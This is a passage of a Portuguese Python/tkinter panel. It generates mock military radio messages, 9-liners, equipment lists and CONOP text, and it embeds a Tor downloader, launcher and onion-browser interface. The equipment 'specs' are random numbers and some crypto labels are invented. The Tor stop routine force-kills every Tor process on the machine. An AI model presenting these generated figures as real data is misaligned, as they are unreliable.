        self.radio_out.insert("1.0", "CALLSIGN 2025: " + cs + "\\nEx: " + cs + " this is " + random.choice(prefixes) + " 1-1, OVER")

    def gen_tac_freq(self):
        freq = random.uniform(30, 87.975)
        hopset = random.randint(1, 6)
        self.radio_out.delete("1.0", "end")
        self.radio_out.insert("1.0", "FREQ TÁTICA 2025:\\n" + str(round(freq,3)) + " MHz FM\\nHopset: " + str(hopset) + "\\nCrypto: KY-99 Fill " + str(random.randint(1,10)) + " / AES-256\\nNet ID: " + str(random.randint(100,999)) + " | MPU5 MANET\\n")

    def gen_9liner(self):
        nine = [
            "L1 IP/BP: 38TLM12345678",
            "L2 Heading: 090° Offset: 200m",
            "L3 Distance: 1200m",
            "L4 Target Elev: 150m",
            "L5 Target Desc: Bunker com antena Starlink - 2025",
            "L6 Grid: 38TLM1234 5678",
            "L7 Mark: IR Pointer + Laser",
            "L8 Friendlies: 200m sul - com GPNVG-18",
            "L9 Egress: 270° para RP",
        ]
        self.radio_out.delete("1.0", "end")
        self.radio_out.insert("1.0", "9-LINER CAS 2025:\\n" + "\\n".join(nine))

    def gen_medevac(self):
        med = [
            "L1 Local: 38TLM12345678",
            "L2 Radio: 40.5 MHz, Callsign WARRIOR 6 - MPU5",
            "L3 Pacientes: 1 Urgente, 2 Rotina",
            "L4 Equipamento: Nenhum",
            "L5 Pacientes: 1 em maca, 2 andando",
            "L6 Segurança: Sem inimigo - EW check OK",
            "L7 Método: Hoist + Starlink med",
            "L8 Pacientes nacionalidade: PT",
            "L9 NBC: Nenhum",
        ]
        self.radio_out.delete("1.0", "end")
        self.radio_out.insert("1.0", "9-LINER MEDEVAC 2025:\\n" + "\\n".join(med))

    def build_equip(self):
        tk.Label(self.tab_equip, text="EQUIPAMENTOS & ORDER OF BATTLE (OOB) 2025 ATUALIZADO", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w", padx=10, pady=10)
        self.equip_list = tk.Listbox(self.tab_equip, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, selectbackground=ACCENT_DIM, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, height=12)
        self.equip_list.pack(fill="x", padx=10, pady=5)
        equips = [
            "AN/PRC-163 - Rádio multibanda 2025 - 30-512 MHz, SATCOM, MANET",
            "AN/PRC-167 - Next Gen - 30MHz-2.5GHz, MPU5",
            "MPU5 - MANET 2025 - Silvus, Wave Relay",
            "PVS-31A - NVG Binocular 2025 - White Phosphor",
            "GPNVG-18 - Quad NVG Panorâmico",
            "PEQ-15 / PEQ-16 - Laser IR/Visível 2025",
            "M4A1 + URG-I 14.5 - 2025",
            "FN SCAR-H / SCAR-SC 2025",
            "Barrett MK22 MRAD .338 / .300",
            "Javelin FGM-148F - ATGM 2025",
            "Spike LR2 / NLOS",
            "DJI Matrice 350 RTK - Drone ISR 2025",
            "DJI Mavic 3T Thermal 2025",
            "Raven RQ-11B / Puma 3 AE - UAV tático 2025",
            "MQ-9B SkyGuardian - UCAV 2025",
            "Bayraktar TB3 / Akinci / Kizilelma 2025",
            "HMMWV M1151 / JLTV Oshkosh 2025",
            "Leopard 2A8 + Trophy APS 2025",
            "Abrams M1A2 SEPv4 2025",
            "KF51 Panther 130mm 2025",
        ]
        for e in equips:
            self.equip_list.insert("end", e)
        self.equip_out = scrolledtext.ScrolledText(self.tab_equip, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.equip_out.pack(fill="both", expand=True, padx=10, pady=10)
        self.equip_out.insert("1.0", "Selecione equipamento 2025 acima para detalhes táticos.\\nOOB Templates: Pelotão, Companhia, Batalhão - NATO 2025\\n")
        self.equip_list.bind("<<ListboxSelect>>", lambda e: self.show_equip())

    def show_equip(self):
        sel = self.equip_list.curselection()
        if not sel:
            return
        txt = self.equip_list.get(sel[0])
        self.equip_out.delete("1.0", "end")
        self.equip_out.insert("1.0", "EQUIPAMENTO 2025:\\n" + txt + "\\n\\nSpecs 2025:\\n• Peso: " + str(random.randint(1,25)) + " kg\\n• Alcance: " + str(random.randint(300,3500)) + " m\\n• Bateria: " + str(random.randint(8,72)) + "h\\n• Crypto: AES-256\\n• IA: Sim (2025)\\n")

    def build_mission(self):
        tk.Label(self.tab_mission, text="MISSION PLANNER 2025 - 5 PARÁGRAFOS + CONOP ATUALIZADO", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w", padx=10, pady=10)
        form = tk.Frame(self.tab_mission, bg=BG)
        form.pack(fill="x", padx=10, pady=5)
        self.mission_entries = {}
        fields = [
            ("Nome Missão", "OP AIRES THUNDER 2025"),
            ("Tipo", "Recon / DA / SR 2025"),
            ("Local MGRS", "38TLM12345678"),
            ("Data/Hora Z", datetime.datetime.utcnow().strftime("%d%H%M%b%y").upper()),
            ("Força", "Team 6 pax - GPNVG-18 + PRC-163"),
        ]
        for label, default in fields:
            row = tk.Frame(form, bg=BG)
            row.pack(fill="x", pady=2)
            tk.Label(row, text=label+":", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8), width=14, anchor="w").pack(side="left")
            e = tk.Entry(row, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
            e.pack(side="left", fill="x", expand=True, padx=5, ipady=3)
            e.insert(0, default)
            self.mission_entries[label] = e
        tk.Button(form, text="GERAR CONOP 5 PARÁGRAFOS 2025", command=self.gen_conop, bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 9, "bold"), relief="flat", bd=0, padx=12, pady=6, cursor="hand2").pack(fill="x", pady=10)
        self.mission_out = scrolledtext.ScrolledText(self.tab_mission, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.mission_out.pack(fill="both", expand=True, padx=10, pady=10)
        self.mission_out.insert("1.0", "Mission Planner 2025 pronto.\\n")

    def gen_conop(self):
        nome = self.mission_entries["Nome Missão"].get()
        tipo = self.mission_entries["Tipo"].get()
        local = self.mission_entries["Local MGRS"].get()
        dtg = self.mission_entries["Data/Hora Z"].get()
        forca = self.mission_entries["Força"].get()
        conop = "CONOP 2025 - " + nome + "\\nDTG: " + dtg + "Z | Local: " + local + " | Força: " + forca + " | Tipo: " + tipo + "\\n\\n"
        conop += "1. SITUAÇÃO 2025:\\n a. Inimigo: Força irregular 6-8 pax, AK, PKM, IED, Drone FPV, EW Krasukha\\n b. Amigo: " + forca + ", CAS F-16V 30min, QRF JLTV 15min, C-UAS Skynex\\n c. Anexos: Civis, Starlink, ROE restritivo\\n\\n"
        conop += "2. MISSÃO:\\n " + forca + " conduz " + tipo + " em " + local + " NLT " + dtg + "Z para confirmar/neutralizar alvo com GPNVG-18 + MPU5\\n\\n"
        conop += "3. EXECUÇÃO:\\n a. Conceito: Infiltração 0200Z, ORP 500m, Recon com Mavic 3T, DA se necessário, Exfil 0400Z\\n b. Tarefas: Alpha segurança, Bravo assalto, Charlie apoio + C-UAS\\n c. Coordenação: Freq 40.5 MHz MPU5, Callsign WARRIOR 6, IR strobe + Starlink\\n\\n"
        conop += "4. SUSTENTAÇÃO 2025:\\n a. Logística: 3 dias, baterias Li-Ion, munição 300rds, Starlink\\n b. Médico: TCCC, MEDEVAC 9-liner, CCP em " + local + "\\n\\n"
        conop += "5. COMANDO E COMUNICAÇÕES 2025:\\n a. Comando: WARRIOR 6 Actual\\n b. Comms: Primária MPU5 40.5, Secundária 243.0 Guarda, SATCOM Starshield 311.0\\n c. Código: Challenge WHISKEY 2025, Response TANGO\\n"
        self.mission_out.delete("1.0", "end")
        self.mission_out.insert("1.0", conop)




class TorEmbeddedService:
    """Serviço Tor embutido - gerencia binário Tor dentro do painel"""
    def __init__(self, base_dir):
        self.base_dir = base_dir
        self.tor_dir = os.path.join(base_dir, "tor_embedded")
        self.data_dir = os.path.join(self.tor_dir, "data")
        self.bin_dir = os.path.join(self.tor_dir, "bin")
        self.torrc_path = os.path.join(self.tor_dir, "torrc")
        self.log_path = os.path.join(self.tor_dir, "tor.log")
        self.geoip_path = os.path.join(self.tor_dir, "geoip")
        self.geoip6_path = os.path.join(self.tor_dir, "geoip6")
        
        self.process = None
        self.tor_binary = None
        
        os.makedirs(self.tor_dir, exist_ok=True)
        os.makedirs(self.data_dir, exist_ok=True)
        os.makedirs(self.bin_dir, exist_ok=True)
        
        self.find_binary()
    
    def find_binary(self):
        # Procura binário tor
        candidates = [
            os.path.join(self.bin_dir, "tor.exe" if platform.system() == "Windows" else "tor"),
            os.path.join(self.tor_dir, "tor.exe" if platform.system() == "Windows" else "tor"),
            os.path.join(self.tor_dir, "Tor", "tor.exe"),
            os.path.join(self.base_dir, "tor", "tor.exe" if platform.system() == "Windows" else "tor"),
            shutil.which("tor"),
            shutil.which("tor.exe"),
            # Tor Browser locations
            os.path.expandvars(r"%USERPROFILE%\Desktop\Tor Browser\Browser\TorBrowser\Tor\tor.exe") if platform.system() == "Windows" else None,
            os.path.expanduser("~/tor-browser_en-US/Browser/TorBrowser/Tor/tor") if platform.system() != "Windows" else None,
            "/usr/bin/tor",
            "/usr/sbin/tor",
            "/opt/tor/bin/tor",
        ]
        for cand in candidates:
            if cand and os.path.isfile(cand) and os.access(cand, os.X_OK):
                self.tor_binary = cand
                return cand
            # also check without X_OK on Windows
            if cand and os.path.isfile(cand) and platform.system() == "Windows":
                self.tor_binary = cand
                return cand
        return None
    
    def is_installed(self):
        return self.tor_binary is not None and os.path.isfile(self.tor_binary)
    
    def is_running(self):
        if self.process and self.process.poll() is None:
            return True
        # check ports
        for port in [9050, 9051, 9150, 9151]:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            try:
                if s.connect_ex(("127.0.0.1", port)) == 0:
                    s.close()
                    return True
            except:
                pass
            s.close()
        return False
    
    def generate_torrc(self, socks_port=9050, control_port=9051):
        # Gera torrc mínimo
        torrc_content = f"""
SocksPort {socks_port}
ControlPort {control_port}
DataDirectory {self.data_dir}
Log notice file {self.log_path}
Log notice stdout
CookieAuthentication 1
AvoidDiskWrites 1
ClientOnly 1
"""
        # GeoIP se existir
        if os.path.isfile(self.geoip_path):
            torrc_content += f"GeoIPFile {self.geoip_path}\n"
        if os.path.isfile(self.geoip6_path):
            torrc_content += f"GeoIPFile6 {self.geoip6_path}\n"
        
        # Configs extras para privacidade
        torrc_content += """
# Extra privacy
ClientUseIPv6 1
EnforceDistinctSubnets 1
NewCircuitPeriod 40
MaxCircuitDirtiness 600
"""
        with open(self.torrc_path, "w", encoding="utf-8") as f:
            f.write(torrc_content)
        return self.torrc_path
    
    def start(self, socks_port=9050, control_port=9051):
        if self.is_running():
            return True, "Tor já está rodando"
        
        if not self.is_installed():
            self.find_binary()
            if not self.is_installed():
                return False, "Binário Tor não encontrado. Baixe o Expert Bundle."
        
        self.generate_torrc(socks_port, control_port)
        
        try:
            # Limpa log antigo
            if os.path.exists(self.log_path):
                os.remove(self.log_path)
            
            # Inicia processo
            cmd = [self.tor_binary, "-f", self.torrc_path]
            if platform.system() == "Windows":
                # Windows: esconde janela
                creationflags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
                self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, creationflags=creationflags, cwd=self.tor_dir)
            else:
                self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd=self.tor_dir)
            
            # Aguarda bootstrap
            for _ in range(30):  # 30 segundos max
                time.sleep(1)
                if self.is_port_open(socks_port):
                    # verifica log para 100%
                    if os.path.exists(self.log_path):
                        with open(self.log_path, "r", encoding="utf-8", errors="ignore") as f:
                            log = f.read()
                            if "Bootstrapped 100%" in log or "Bootstrapped 100% (done)" in log:
                                return True, f"Tor iniciado com sucesso na porta {socks_port}"
                    # se porta aberta, considera ok mesmo sem 100%
                    if _ > 5:
                        return True, f"Tor iniciado (porta {socks_port} aberta, bootstrap em progresso)"
                if self.process.poll() is not None:
                    # processo morreu
                    out, _ = self.process.communicate()
                    return False, f"Tor falhou ao iniciar: {out.decode(errors='ignore')[:500]}"
            
            return True, f"Tor iniciado (timeout bootstrap, mas porta {socks_port} verificada)"
        except Exception as e:
            return False, f"Erro ao iniciar Tor: {e}"
    
    def stop(self):
        killed = False
        if self.process and self.process.poll() is None:
            try:
                self.process.terminate()
                self.process.wait(timeout=5)
                killed = True
            except:
                try:
                    self.process.kill()
                    killed = True
                except:
                    pass
            self.process = None
        
        # Tenta matar processos tor externos na porta
        try:
            if platform.system() == "Windows":
                subprocess.run(["taskkill", "/F", "/IM", "tor.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                subprocess.run(["pkill", "-f", "tor.*torrc"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        
        time.sleep(0.5)
        if not self.is_running():
            return True, "Tor parado"
        return False, "Falha ao parar Tor (pode estar rodando externo)"
    
    def is_port_open(self, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        try:
            result = s.connect_ex(("127.0.0.1", port)) == 0
            s.close()
            return result
        except:
            s.close()
            return False
    
    def get_log(self, lines=100):
        if not os.path.exists(self.log_path):
            return "[Log não existe ainda]"
        try:
            with open(self.log_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.readlines()
                return "".join(content[-lines:])
        except Exception as e:
            return f"[Erro lendo log] {e}"
    
    def download_tor_bundle(self, progress_callback=None):
        """Baixa Tor Expert Bundle"""
        system = platform.system()
        arch = "x86_64"
        
        # URLs tentativas - versões recentes
        # Lista de versões para tentar
        versions = ["14.0.4", "13.5.7", "13.0.15", "12.5.6"]
        
        base_urls = []
        if system == "Windows":
            for ver in versions:
                base_urls.append(f"https://www.torproject.org/dist/torbrowser/{ver}/tor-expert-bundle-windows-{arch}-{ver}.tar.gz")
                base_urls.append(f"https://archive.torproject.org/tor-package-archive/torbrowser/{ver}/tor-expert-bundle-windows-{arch}-{ver}.tar.gz")
        elif system == "Linux":
            for ver in versions:
                base_urls.append(f"https://www.torproject.org/dist/torbrowser/{ver}/tor-expert-bundle-linux-{arch}-{ver}.tar.gz")
                base_urls.append(f"https://archive.torproject.org/tor-package-archive/torbrowser/{ver}/tor-expert-bundle-linux-{arch}-{ver}.tar.gz")
        else:  # Darwin
            for ver in versions:
                base_urls.append(f"https://www.torproject.org/dist/torbrowser/{ver}/tor-expert-bundle-macos-aarch64-{ver}.tar.gz")
        
        # Fallback: tenta baixar tor binário direto do GitHub ou dist.torproject.org/tor
        base_urls.extend([
            "https://www.torproject.org/dist/tor/tor-0.4.8.12.tar.gz",  # source - não ideal mas tenta
        ])
        
        download_path = os.path.join(self.tor_dir, "tor_bundle.tar.gz")
        
        for url in base_urls:
            try:
                if progress_callback:
                    progress_callback(f"Tentando {url}...")
                
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=30) as resp:
                    total = int(resp.headers.get("Content-Length", 0))
                    downloaded = 0
                    with open(download_path, "wb") as f:
                        while True:
                            chunk = resp.read(8192)
                            if not chunk:
                                break
                            f.write(chunk)
                            downloaded += len(chunk)
                            if progress_callback and total > 0:
                                pct = int(downloaded * 100 / total)
                                progress_callback(f"Baixando {url.split('/')[-1]}: {pct}% ({downloaded//1024}KB)")
                
                # Extrai
                if progress_callback:
                    progress_callback("Extraindo...")
                
                import tarfile
                with tarfile.open(download_path, "r:gz") as tar:
                    # Extrai para tor_dir
                    tar.extractall(path=self.tor_dir)
                
                os.remove(download_path)
                
                # Procura binário extraído
                for root, dirs, files in os.walk(self.tor_dir):
                    for file in files:
                        if file == "tor" or file == "tor.exe":
                            full_path = os.path.join(root, file)
                            # move para bin_dir
                            dest = os.path.join(self.bin_dir, file)
                            shutil.copy2(full_path, dest)
                            if platform.system() != "Windows":
                                os.chmod(dest, 0o755)
                            self.tor_binary = dest
                            # procura geoip
                            for geo in ["geoip", "geoip6"]:
                                geo_src = os.path.join(root, geo)
                                if os.path.exists(geo_src):
                                    shutil.copy2(geo_src, os.path.join(self.tor_dir, geo))
                            
                            if progress_callback:
                                progress_callback(f"Tor instalado em {dest}")
                            return True, f"Tor instalado com sucesso: {dest}"
                
                if progress_callback:
                    progress_callback("Binário não encontrado no arquivo, tentando próxima URL...")
                    
            except Exception as e:
                if progress_callback:
                    progress_callback(f"Falha {url}: {e}")
                continue
        
        return False, "Falha ao baixar Tor de todas as URLs. Baixe manualmente o Expert Bundle de https://www.torproject.org/download/ e extraia para tor_embedded/bin/"


class NavegadoresPage(Page):
    """NAVEGADOR ONION COMPLETO COM TOR SERVICE EMBUTIDO - 2026"""
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.header("NAVEGADOR // ONION ROUTER + TOR SERVICE EMBUTIDO", "Tor embutido dentro do painel • SOCKS5 9050 • Navegação .onion • 100% interno")

        # Files
        self.bookmarks_file = os.path.join(BASE_DIR, "navegador_bookmarks.json")
        self.history_file = os.path.join(BASE_DIR, "navegador_history.json")
        self.bookmarks = load_json(self.bookmarks_file, [])
        self.history = load_json(self.history_file, [])

        # Tor Service
        self.tor_service = TorEmbeddedService(BASE_DIR)

        # State
        self.tor_enabled = tk.BooleanVar(value=False)
        self.private_mode = tk.BooleanVar(value=True)
        self.js_enabled = tk.BooleanVar(value=False)
        self.images_enabled = tk.BooleanVar(value=False)
        self.current_url = tk.StringVar(value="https://duckduckgo.com")
        self.tor_status_var = tk.StringVar(value="Tor: Verificando...")
        self.ip_status_var = tk.StringVar(value="IP: --")
        self.circuit_var = tk.StringVar(value="Circuito: --")
        self.ua_var = tk.StringVar(value="Tor Browser 13.0 (Windows NT 10.0; rv:115.0)")
        self.tor_service_status_var = tk.StringVar(value="Serviço Tor: Verificando...")

        self.back_stack = []
        self.forward_stack = []
        self.html_frame = None
        self.html_label = None
        self.use_embedded_browser = False

        self._try_load_browser_libs()

        style = ttk.Style()
        style.theme_use("default")
        style.configure("TNotebook", background=BG, borderwidth=0)
        style.configure("TNotebook.Tab", background=BTN_BG, foreground=TEXT_DIM, padding=[10, 6], font=(FONT_MONO, 8, "bold"), borderwidth=0)
        style.map("TNotebook.Tab", background=[("selected", ACCENT_DIM)], foreground=[("selected", ACCENT)])

        # Top Nav Bar
        nav = tk.Frame(self, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        nav.pack(fill="x", padx=12, pady=(0,6), ipady=6)

        for txt, cmd in [("◀", self.go_back), ("▶", self.go_forward), ("↻", self.refresh_page), ("⌂", self.go_home)]:
            b = tk.Button(nav, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 10, "bold"), relief="flat", width=3, cursor="hand2")
            b.pack(side="left", padx=2)
            style_button(b)

        self.url_entry = tk.Entry(nav, textvariable=self.current_url, font=(FONT_MONO, 10), bg=BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, highlightcolor=ACCENT)
        self.url_entry.pack(side="left", fill="x", expand=True, padx=8, ipady=6)
        self.url_entry.bind("<Return>", lambda e: self.navigate())

        btn_go = tk.Button(nav, text="IR", command=self.navigate, bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 9, "bold"), relief="flat", padx=12)
        btn_go.pack(side="left", padx=2, ipady=5)
        style_button(btn_go)

        chk_tor = tk.Checkbutton(nav, text="🧅 TOR", variable=self.tor_enabled, bg=PANEL_BG, fg="#ff5c8a", selectcolor=BG, font=(FONT_MONO, 8, "bold"), activebackground=PANEL_BG, command=self.toggle_tor)
        chk_tor.pack(side="left", padx=6)

        chk_priv = tk.Checkbutton(nav, text="👁️‍🗨️ PRIVADO", variable=self.private_mode, bg=PANEL_BG, fg=ACCENT, selectcolor=BG, font=(FONT_MONO, 8, "bold"), activebackground=PANEL_BG)
        chk_priv.pack(side="left", padx=4)

        btn_external = tk.Button(nav, text="↗ EXTERNO", command=self.open_external, font=(FONT_MONO, 7, "bold"))
        btn_external.pack(side="left", padx=4)
        style_button(btn_external)

        btn_clica_tudo = tk.Button(nav, text="⚡ CLICA TUDO", command=self.clica_tudo_browser, bg="#ff0040", fg="white", font=(FONT_MONO, 8, "bold"), relief="flat")
        btn_clica_tudo.pack(side="right", padx=4, ipady=5)
        btn_clica_tudo.bind("<Enter>", lambda e: btn_clica_tudo.configure(bg="#ff2050"))
        btn_clica_tudo.bind("<Leave>", lambda e: btn_clica_tudo.configure(bg="#ff0040"))

        # Status bar
        status_bar = tk.Frame(self, bg=BG)
        status_bar.pack(fill="x", padx=12, pady=(0,4))
        tk.Label(status_bar, textvariable=self.tor_status_var, bg=BG, fg="#ffb700", font=(FONT_MONO, 8, "bold")).pack(side="left")
        tk.Label(status_bar, text=" | ", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        tk.Label(status_bar, textvariable=self.ip_status_var, bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        tk.Label(status_bar, text=" | ", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        tk.Label(status_bar, textvariable=self.circuit_var, bg=BG, fg=ACCENT, font=(FONT_MONO, 7)).pack(side="left", padx=6)
        self.secure_label = tk.Label(status_bar, text="🔒 Conexão segura", bg=BG, fg="#00ff88", font=(FONT_MONO, 7, "bold"))
        self.secure_label.pack(side="right")

        # Notebook
        nb = ttk.Notebook(self)
        nb.pack(fill="both", expand=True, padx=12, pady=(0,10))

        tab_browser = tk.Frame(nb, bg=BG)
        tab_tor_embedded = tk.Frame(nb, bg=BG)
        tab_tor = tk.Frame(nb, bg=BG)
        tab_onion = tk.Frame(nb, bg=BG)
        tab_bookmarks = tk.Frame(nb, bg=BG)
        tab_security = tk.Frame(nb, bg=BG)
        tab_tools = tk.Frame(nb, bg=BG)

        nb.add(tab_browser, text=" 🌐 NAVEGADOR ")
        nb.add(tab_tor_embedded, text=" 🔧 TOR EMBUTIDO ")
        nb.add(tab_tor, text=" 🧅 TOR NETWORK ")
        nb.add(tab_onion, text=" 🔍 ONION SEARCH ")
        nb.add(tab_bookmarks, text=" 📑 BOOKMARKS ")
        nb.add(tab_security, text=" 🛡️ SEGURANÇA ")
        nb.add(tab_tools, text=" ⚙️ CONFIG ")

        self._build_browser_tab(tab_browser)
        self._build_tor_embedded_tab(tab_tor_embedded)
        self._build_tor_tab(tab_tor)
        self._build_onion_tab(tab_onion)
        self._build_bookmarks_tab(tab_bookmarks)
        self._build_security_tab(tab_security)
        self._build_tools_tab(tab_tools)

        self.after(800, self.verificar_tor_completo)
        self.after(1000, self.check_embedded_tor_status)
        self.after(1200, lambda: self.navigate("https://duckduckgo.com", add_history=False))

    def _try_load_browser_libs(self):
        try:
            from tkinterweb import HtmlFrame
            self.HtmlFrame = HtmlFrame
            self.use_embedded_browser = True
        except:
            try:
                from tkhtmlview import HTMLLabel
                self.HTMLLabel = HTMLLabel
                self.use_embedded_browser = False
            except:
                self.use_embedded_browser = False

    def _build_browser_tab(self, parent):
        tb = tk.Frame(parent, bg=BG)
        tb.pack(fill="x", padx=6, pady=4)
        for txt, cmd in [("📄 Ver Fonte", self.view_source), ("💾 Salvar Página", self.save_page), ("📋 Copiar URL", lambda: self._copy_text(self.current_url.get())), ("🧹 Limpar View", self.clear_view)]:
            b = tk.Button(tb, text=txt, command=cmd, font=(FONT_MONO, 7, "bold"))
            b.pack(side="left", padx=2, ipady=3)
            style_button(b)

        self.browser_container = tk.Frame(parent, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.browser_container.pack(fill="both", expand=True, padx=6, pady=4)

        if hasattr(self, 'HtmlFrame'):
            try:
                self.html_frame = self.HtmlFrame(self.browser_container, messages_enabled=False)
                self.html_frame.pack(fill="both", expand=True)
                self.html_frame.load_website("https://duckduckgo.com")
                self.browser_text = None
            except Exception as e:
                self.html_frame = None
                self._create_text_browser()
        else:
            self._create_text_browser()

        bottom = tk.Frame(parent, bg=BG)
        bottom.pack(fill="x", padx=6, pady=2)
        tk.Label(bottom, text="LINKS EXTRAÍDOS (duplo clique abre):", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 7, "bold")).pack(anchor="w")
        self.links_list = tk.Listbox(bottom, height=5, bg="#0a121a", fg=ACCENT, font=(FONT_MONO, 8), relief="flat", selectbackground=ACCENT_DIM)
        self.links_list.pack(fill="x", pady=2)
        self.links_list.bind("<Double-Button-1>", lambda e: self._open_selected_link())

    def _create_text_browser(self):
        self.browser_text = scrolledtext.ScrolledText(self.browser_container, font=(FONT_MONO, 10), bg="#0a121a", fg=TEXT, wrap="word", relief="flat", highlightthickness=0, insertbackground=ACCENT)
        self.browser_text.pack(fill="both", expand=True)
        self.browser_text.insert("1.0", "[Navegador Texto] Pronto.\n\nModo texto ativado (sem HtmlFrame).\nInstala: pip install tkinterweb\n\nFuncionalidades ativas:\n• Fetch via requests + Tor SOCKS5 embutido\n• Renderização texto + links extraídos\n• Tor Service embutido na aba 🔧 TOR EMBUTIDO\n\nNavega pela barra de URL no topo.\n")

    def _open_selected_link(self):
        sel = self.links_list.curselection()
        if not sel:
            return
        url = self.links_list.get(sel[0]).strip()
        if url.startswith("http"):
            self.current_url.set(url)
            self.navigate()

    def _build_tor_embedded_tab(self, parent):
        top = tk.Frame(parent, bg=BG)
        top.pack(fill="x", padx=10, pady=10)
        tk.Label(top, text="TOR SERVICE EMBUTIDO // DENTRO DO PAINEL", bg=BG, fg="#00ff88", font=(FONT_MONO, 13, "bold")).pack(anchor="w")
        tk.Label(top, text="Tor roda 100% dentro da app - sem instalar Tor Browser - binário em tor_embedded/bin/", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w", pady=(2,8))

        # Status frame
        status_frame = tk.Frame(parent, bg=PANEL_BG, highlightthickness=1, highlightbackground="#00ff88")
        status_frame.pack(fill="x", padx=10, pady=5, ipadx=10, ipady=10)

        tk.Label(status_frame, text="STATUS DO SERVIÇO EMBUTIDO", bg=PANEL_BG, fg="#00ff88", font=(FONT_MONO, 10, "bold")).pack(anchor="w")

        self.embedded_status_label = tk.Label(status_frame, textvariable=self.tor_service_status_var, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 9, "bold"), justify="left")
        self.embedded_status_label.pack(anchor="w", pady=6)

        # Info binário
        self.embedded_bin_label = tk.Label(status_frame, text="Binário: procurando...", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 8), justify="left")
        self.embedded_bin_label.pack(anchor="w")

        # Botões controle
        btns = tk.Frame(status_frame, bg=PANEL_BG)
        btns.pack(fill="x", pady=10)

        self.btn_start_tor = tk.Button(btns, text="▶ INICIAR TOR EMBUTIDO", command=self.start_embedded_tor, bg="#00ff88", fg="black", font=(FONT_MONO, 10, "bold"), relief="flat", padx=12, pady=8, cursor="hand2")
        self.btn_start_tor.pack(side="left", fill="x", expand=True, padx=3)

        self.btn_stop_tor = tk.Button(btns, text="⏹ PARAR TOR", command=self.stop_embedded_tor, bg="#ff3b5c", fg="white", font=(FONT_MONO, 10, "bold"), relief="flat", padx=12, pady=8, cursor="hand2")
        self.btn_stop_tor.pack(side="left", fill="x", expand=True, padx=3)

        btn_restart = tk.Button(btns, text="🔄 REINICIAR", command=self.restart_embedded_tor, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 9, "bold"), relief="flat", padx=12, pady=8)
        btn_restart.pack(side="left", fill="x", expand=True, padx=3)
        style_button(btn_restart)

        # Segunda linha botões
        btns2 = tk.Frame(status_frame, bg=PANEL_BG)
        btns2.pack(fill="x", pady=3)

        for txt, cmd, col in [
            ("📥 BAIXAR TOR BUNDLE", self.download_tor_bundle, "#ffb700"),
            ("📂 ABRIR PASTA TOR", self.open_tor_folder, ACCENT),
            ("⚡ CLICA TUDO - INSTALA + INICIA", self.clica_tudo_embedded, "#ff0040"),
        ]:
            b = tk.Button(btns2, text=txt, command=cmd, font=(FONT_MONO, 8, "bold"), bg=BTN_BG, fg=col, relief="flat", padx=8, pady=6)
            b.pack(side="left", fill="x", expand=True, padx=3)
            style_button(b)
            b.configure(fg=col)

        # Logs e config
        mid = tk.Frame(parent, bg=BG)
        mid.pack(fill="both", expand=True, padx=10, pady=5)

        left = tk.Frame(mid, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        left.pack(side="left", fill="both", expand=True, padx=(0,5))

        tk.Label(left, text="LOG DO TOR EMBUTIDO (tor.log)", bg=PANEL_BG, fg="#00ff88", font=(FONT_MONO, 9, "bold")).pack(anchor="w", padx=8, pady=(6,2))
        self.embedded_log = scrolledtext.ScrolledText(left, font=(FONT_MONO, 8), bg="#0a121a", fg="#aaffaa", relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, height=18)
        self.embedded_log.pack(fill="both", expand=True, padx=8, pady=4)
        self.embedded_log.insert("1.0", "[Tor Embedded] Aguardando ação...\n\nComo funciona:\n1. Clica BAIXAR TOR BUNDLE (baixa Expert Bundle oficial)\n2. Extrai para tor_embedded/bin/\n3. Clica INICIAR TOR EMBUTIDO\n4. Tor sobe em 127.0.0.1:9050 + Control 9051\n5. Ativa 🧅 TOR no topo e navega .onion\n\nO serviço roda dentro do painel, sem precisar Tor Browser externo.\n")

        btns_log = tk.Frame(left, bg=PANEL_BG)
        btns_log.pack(fill="x", padx=8, pady=4)
        tk.Button(btns_log, text="🔄 Atualizar Log", command=self.refresh_embedded_log, font=(FONT_MONO, 7, "bold")).pack(side="left", padx=2)
